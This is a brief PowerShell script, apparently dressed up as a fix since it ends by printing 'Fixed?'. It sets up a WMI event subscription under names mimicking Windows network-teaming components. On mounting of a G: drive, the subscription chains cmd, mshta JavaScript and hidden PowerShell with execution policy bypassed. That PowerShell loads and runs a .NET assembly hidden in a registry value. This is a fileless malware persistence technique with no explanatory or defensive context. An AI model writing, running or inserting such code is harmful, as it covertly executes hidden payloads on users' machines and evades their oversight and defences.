$usb = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2 AND DriveName = 'G:'"

$filter = Register-CimIndicationEvent -Namespace root\cimv2 -Query $usb -SourceIdentifier "NetLbfoTeamNic"

$injection = {
    Start-Process cmd.exe -ArgumentList '/c mshta "javascript:close(new ActiveXObject(''WScript.Shell'').run(''powershell -ExecutionPolicy Bypass -Command \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::ClassesRoot.OpenSubKey(\\\".osk\\\").GetValue(\\\"CryptA\\\")).EntryPoint.Invoke($null,$null)\"'' ,0));"'
}

Register-CimIndicationEvent -Namespace root\cimv2 -Query $usb -Action $injection -SourceIdentifier "NetLbfoTeamMember"

Write-Host "Fixed?" -ForegroundColor Cyan
Read-Host
